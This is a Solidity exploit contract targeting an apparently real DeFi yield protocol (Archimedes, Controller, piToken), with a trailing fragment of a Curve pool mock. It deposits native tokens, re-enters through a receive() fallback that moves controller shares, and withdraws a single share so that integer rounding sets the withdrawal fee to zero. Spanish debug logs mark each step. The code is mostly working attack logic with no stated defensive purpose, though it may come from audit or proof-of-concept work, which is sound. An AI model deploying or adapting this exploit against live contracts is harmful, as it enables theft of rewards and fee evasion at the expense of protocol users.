...
import "./ControllerLPWithoutStrat.sol";
import "../interfaces/IWNative.sol";
import "hardhat/console.sol";

contract Exploit {
    Archimedes public archimedes;
    ...
    event GetPiToken(address user, uint intended, uint real);

    constructor(address payable _archimdes, address _controller, address payable _piToken, uint _pid) public {
        archimedes = Archimedes(_archimdes);
        controller = Controller(_controller);
        piToken = IPiToken(_piToken);
        // want = ERC20(_want); // want == Native
        pid = _pid;
    }

    function step1() public payable {
        // want.approve(address(archimedes), 0xffffffffffffffffffffffffffffffff);
        // want.transferFrom(sender, address(this), want.balanceOf(sender));
        archimedes.depositNative{value: msg.value}(pid, address(0));
    }

    receive() external payable {
        console.log("Entro al receive...");
        controller.transfer(address(this), controller.balanceOf(address(this)));
    }

    function exploit() external {
        require(archimedes.pendingPiToken(pid, address(this)) > 0, "Pending amount(reward) is zero");
        uint intended_pending = archimedes.pendingPiToken(pid, address(this));
        console.log("Pending piTokens: ", intended_pending);

        uint pershare = controller.totalSupply() / controller.balance(); // withdraw only one token

        /*
        uint withdrawalFee = _withdraw * withdrawFee / RATIO_PRECISION == uint(1 * 0.001) == 0
        ==> NO FEE! Tricks to avoid fees :)
        */
        console.log("Antes del withdraw: ", piToken.balanceOf(address(this)));
        archimedes.withdraw(pid, pershare);
        console.log("Despues del withdraw: ", piToken.balanceOf(address(this)));
        // emit GetPiToken(address(this), intended_pending, piToken.balanceOf(address(this)));

        // payable(address(msg.sender)).transfer(address(this).balance);
        // piToken.transfer(msg.sender, piToken.balanceOf(address(this)));
    }
}
...
contract CurvePoolMock is ERC20 {
    ...
    address private gauge = address(0x8D9649e50A0d1da8E939f800fB926cdE8f18B47D);
